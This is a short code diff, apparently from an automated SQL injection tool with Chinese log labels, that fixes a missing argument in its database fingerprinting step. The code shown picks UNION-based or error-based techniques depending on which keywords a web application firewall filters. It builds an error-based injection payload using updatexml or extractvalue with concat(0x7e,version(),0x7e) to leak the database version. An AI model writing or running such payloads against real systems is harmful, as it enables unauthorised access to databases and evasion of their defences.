@@ -83,7 +83,7 @@ class Fingerprinter:
         if fp.echo_visible and not waf.is_filtered("union", "select"):
             self._version_via_union(fp)
         elif fp.error_visible and not waf.is_filtered("updatexml", "extractvalue"):
-            self._version_via_error(fp)
+            self._version_via_error(fp, waf)
 
         for n in notes:
             self.log("INFO", f"[指纹] {n}")
@@ -106,7 +106,7 @@ class Fingerprinter:
         if m:
             fp.version, fp.current_db, fp.current_user = m.group(1), m.group(2), m.group(3)
 
-    def _version_via_error(self, fp: Fingerprint):
+    def _version_via_error(self, fp: Fingerprint, waf):
         fn = "updatexml" if not waf.is_filtered("updatexml") else "extractvalue"
         payload = (f"{self._pre()} and {fn}(1,concat(0x7e,version(),0x7e),1)"
                    f"{self._tail() if fn == 'updatexml' else ''}")
